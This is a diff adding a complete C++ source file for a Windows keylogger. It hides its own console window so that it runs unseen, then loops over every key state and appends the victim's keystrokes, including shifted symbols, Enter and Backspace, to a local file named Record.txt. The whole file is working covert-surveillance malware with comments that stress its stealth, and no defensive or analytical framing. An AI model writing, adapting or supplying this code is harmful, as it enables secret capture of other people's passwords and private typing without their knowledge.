@@ -1,0 +1,82 @@
+#include <iostream>
+#include <windows.h>
+#include <fstream>
+
+using namespace std;
+
+// Function prototypes
+void log();
+void hide();
+
+int main() {
+    // Hide the console window to run the program stealthily
+    hide();
+
+    // Start logging keystrokes
+    log();
+
+    return 0;
+}
+
+// Function to log keystrokes
+void log() {
+    char key; // Variable to store the key pressed
+
+    // Infinite loop to continuously check for keystrokes
+    for (;;) {
+        // Loop through possible key values
+        for (key = 8; key <= 222; key++) {
+            // Check if the key was pressed
+            if (GetAsyncKeyState(key) == -32767) {
+                // Open the file in append mode
+                ofstream write("Record.txt", ios::app);
+
+                // Check for uppercase letters without the Shift key
+                if ((key > 64 && key < 91) && !(GetAsyncKeyState(VK_SHIFT))) {
+                    key += 32; // Convert to lowercase
+                    write << key;
+                } 
+                // Check for uppercase letters with the Shift key
+                else if (key > 64 && key < 91) {
+                    write << key;
+                } 
+                // Handle special cases for number keys with and without Shift
+                else if (key >= 48 && key <= 57) {
+                    switch (key) {
+                        case 48: write << (GetAsyncKeyState(VK_SHIFT) ? ")" : "0"); break;
+                        case 49: write << (GetAsyncKeyState(VK_SHIFT) ? "!" : "1"); break;
+                        case 50: write << (GetAsyncKeyState(VK_SHIFT) ? "@" : "2"); break;
+                        case 51: write << (GetAsyncKeyState(VK_SHIFT) ? "#" : "3"); break;
+                        case 52: write << (GetAsyncKeyState(VK_SHIFT) ? "$" : "4"); break;
+                        case 53: write << (GetAsyncKeyState(VK_SHIFT) ? "%" : "5"); break;
+                        case 54: write << (GetAsyncKeyState(VK_SHIFT) ? "^" : "6"); break;
+                        case 55: write << (GetAsyncKeyState(VK_SHIFT) ? "&" : "7"); break;
+                        case 56: write << (GetAsyncKeyState(VK_SHIFT) ? "*" : "8"); break;
+                        case 57: write << (GetAsyncKeyState(VK_SHIFT) ? "(" : "9"); break;
+                    }
+                } 
+                // Handle other special keys
+                else {
+                    switch (key) {
+                        case VK_BACK: write << "<Backspace>"; break;
+                        case VK_RETURN: write << "<Enter>\n"; break;
+                        case VK_SPACE: write << " "; break;
+                        case VK_TAB: write << "<Tab>"; break;
+                        case VK_ESCAPE: write << "<Esc>"; break;
+                        default: write << key; break;
+                    }
+                }
+
+                write.close(); // Close the file
+            }
+        }
+    }
+}
+
+// Function to hide the console window
+void hide() {
+    HWND stealth; // Handle to the console window
+    AllocConsole(); // Allocate a console for the program
+    stealth = FindWindowA("ConsoleWindowClass", NULL); // Find the console window
+    ShowWindow(stealth, 0); // Hide the console window
+}
